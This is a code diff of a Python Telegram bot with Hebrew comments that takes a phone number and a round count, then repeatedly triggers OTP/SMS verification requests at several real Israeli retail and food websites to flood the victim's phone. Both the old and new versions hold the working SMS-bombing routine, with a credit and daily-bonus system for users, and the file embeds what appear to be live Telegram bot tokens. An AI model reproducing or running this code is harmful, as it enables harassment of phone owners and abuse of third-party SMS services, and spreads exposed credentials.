@@ -1,76 +1,134 @@
 import telebot
-from telebot import apihelper
 import requests
 import time
-import random
-import string
+from flask import Flask
+from threading import Thread
+import os
 import uuid
-from datetime import datetime
+from datetime import datetime, timedelta
 
-# --- הגדרות הבוט ---
-TOKEN = "8704312677:AAHO8NSIKI6drQMfHANZaBuF5aBJ2z5_nf0"
+# ביטול הגדרות פרוקסי שעלולות לגרום ל-ProxyError ב-Render
+os.environ['HTTP_PROXY'] = ""
+os.environ['HTTPS_PROXY'] = ""
+os.environ['NO_PROXY'] = "api.telegram.org,*"
 
-# מעקף חסימה עבור Hugging Face (שימוש ב-Proxy)
-apihelper.proxy = {'https': 'http://proxy8.p.pyproxy.com:2315'} 
-# הערה: אם הבוט לא מתחבר, Hugging Face פשוט לא מאפשרים בוטים כאלה בחינם.
+# --- שרת Flask למניעת כיבוי ---
+app = Flask('')
 
-bot = telebot.TeleBot(TOKEN)
-user_credits = {}
-daily_claimed = {}
+@app.route('/')
+def home():
+    return "<h1>Turbo Bot is Online</h1>"
 
-def get_random_string(length=8):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+def run_flask():
+    # Render מעבירה את הפורט במשתנה סביבה PORT
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
 
-def run_attack(chat_id, target, rounds):
-    success_count = 0
-    failed_count = 0
-    for r in range(rounds):
-        f_uuid = str(uuid.uuid4())
-        apis = [
-            {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
-            {"n": "Teva Bari", "u": "https://www.tevabari.co.il/index.php", "d": {"username": target, "option": "com_ajax", "plugin": "smsauth", "group": "authentication", "method": "smsauth", "task": "send", "format": "json"}, "type": "form", "ref": "https://www.tevabari.co.il/"},
-            {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/verify", "d": {"phone": target, "source": "web"}, "type": "json", "ref": "https://www.mishloha.co.il/"},
-            {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
-            {"n": "Gefen Gefen", "u": "https://api-ns.atmos.co.il/rest/22/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 22, "source": "web"}, "type": "json", "ref": "https://gefen-gefen.co.il/"},
-            {"n": "Fox", "u": "https://www.fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.fox.co.il/"},
-            {"n": "Foot Locker", "u": "https://www.footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.footlocker.co.il/"},
-            {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.laline.co.il/"}
-        ]
+def keep_alive():
+    t = Thread(target=run_flask)
+    t.start()
+
+# --- הגדרות בוט ---
+# מומלץ להגדיר BOT_TOKEN ב-Environment Variables ב-Render
+API_TOKEN = os.environ.get("BOT_TOKEN", "8765796507:AAFzWcRX_ftLB7RZoWKgbC_jbTdGHZmqcDg")
+ADMIN_ID = 7265913946
+bot = telebot.TeleBot(API_TOKEN)
+
+user_data = {}
+
+def get_user(uid):
+    if uid not in user_data:
+        user_data[uid] = {'credits': 0, 'last_daily': None}
+    return user_data[uid]
+
+def attack(m, target, rounds):
+    uid = m.from_user.id
+    user = get_user(uid)
+    
+    apis = [
+        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target}, "type": "form", "ref": "https://www.ace.co.il/"},
+        {"n": "Dominos", "u": "https://api.dominos.co.il/sendOtp", "d": {"phone": target}, "type": "json", "ref": "https://www.dominos.co.il/"},
+        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.mishloha.co.il/"},
+        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
+        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
+        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"}
+    ]
+
+    for r in range(int(rounds)):
+        if user['credits'] <= 0:
+            bot.send_message(m.chat.id, "❌ נגמרו לך הקרדיטים!")
+            break
+        
+        user['credits'] -= 1
+        success_count = 0
+        
+        # שימוש ב-Session לשיפור ביצועים
+        session = requests.Session()
+        session.trust_env = False # התעלמות מפרוקסי מערכתי
+        
         for site in apis:
             try:
-                h = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"]}
+                h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Referer": site["ref"]}
                 if site["type"] == "json":
-                    requests.post(site["u"], json=site["d"], headers=h, timeout=3.0)
+                    res = session.post(site["u"], json=site["d"], headers=h, timeout=2)
                 else:
-                    requests.post(site["u"], data=site["d"], headers=h, timeout=3.0)
-                success_count += 1
-                time.sleep(1.5)
+                    res = session.post(site["u"], data=site["d"], headers=h, timeout=2)
+                
+                if res.status_code in [200, 201, 204]:
+                    success_count += 1
             except:
-                failed_count += 1
-    bot.send_message(chat_id, f"📊 סיכום תקיפה ל-{target}:\n✅ הצלחות: {success_count}\n❌ נכשלו: {failed_count}")
+                continue
+        
+        bot.send_message(m.chat.id, f"🚀 סיבוב {r+1} הושלם\n✅ הצלחות: {success_count}/{len(apis)}\n💰 יתרה: {user['credits']}")
+        if r < int(rounds) - 1:
+            time.sleep(1) # השהייה קלה למניעת חסימה
+
+    bot.send_message(m.chat.id, "🏁 הסתיים!")
+
+# --- פקודות הבוט ---
 
 @bot.message_handler(commands=['start'])
-def start(message):
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add("🚀 התחל תקיפה", "💰 יתרה", "🎁 מתנה יומית")
-    bot.send_message(message.chat.id, "🔥 מערכת Spam-Me באוויר!", reply_markup=markup)
+def start(m):
+    welcome = (
+        "👋 ברוכים הבאים ל-Turbo Bot!\n\n"
+        "/me - בדיקת יתרה\n"
+        "/daily - בונוס יומי (10 קרדיטים)\n\n"
+        "🚀 להפעלה, שלח: [סיבובים] [מספר טלפון]\n"
+        "לדוגמה: 5 0501234567"
+    )
+    bot.send_message(m.chat.id, welcome)
 
-@bot.message_handler(func=lambda m: m.text == "🎁 מתנה יומית")
-def gift(message):
-    user_credits[message.from_user.id] = user_credits.get(message.from_user.id, 0) + 5
-    bot.send_message(message.chat.id, "✅ קיבלת 5 קרדיטים!")
+@bot.message_handler(commands=['me'])
+def me(m):
+    u = get_user(m.from_user.id)
+    bot.send_message(m.chat.id, f"👤 המשתמש שלך: {m.from_user.id}\n💰 קרדיטים: {u['credits']}")
 
-@bot.message_handler(func=lambda m: m.text == "🚀 התחל תקיפה")
-def ask_phone(message):
-    msg = bot.send_message(message.chat.id, "שלח מספר טלפון:")
-    bot.register_next_step_handler(msg, process_attack)
+@bot.message_handler(commands=['daily'])
+def daily(m):
+    u = get_user(m.from_user.id)
+    now = datetime.now()
+    if u['last_daily'] and now < u['last_daily'] + timedelta(days=1):
+        bot.reply_to(m, "⚠️ כבר לקחת היום! חזור מחר.")
+    else:
+        u['credits'] += 10
+        u['last_daily'] = now
+        bot.reply_to(m, "🎁 קיבלת 10 קרדיטים מתנה!")
 
-def process_attack(message):
-    target = message.text
-    if user_credits.get(message.from_user.id, 0) < 1:
-        return bot.send_message(message.chat.id, "❌ אין קרדיטים.")
-    user_credits[message.from_user.id] -= 1
-    bot.send_message(message.chat.id, f"⚡ תוקף את {target}...")
-    run_attack(message.chat.id, target, 1)
+@bot.message_handler(func=lambda m: True)
+def handle(m):
+    try:
+        p = m.text.split()
+        if len(p) == 2 and p[0].isdigit() and p[1].startswith('05'):
+            attack(m, p[1], p[0])
+    except Exception as e:
+        print(f"Error: {e}")
 
-bot.polling()
+if __name__ == "__main__":
+    keep_alive()
+    print("Bot is starting...")
+    while True:
+        try:
+            bot.polling(none_stop=True, interval=0, timeout=20)
+        except Exception as e:
+            print(f"Polling error: {e}")
+            time.sleep(5)
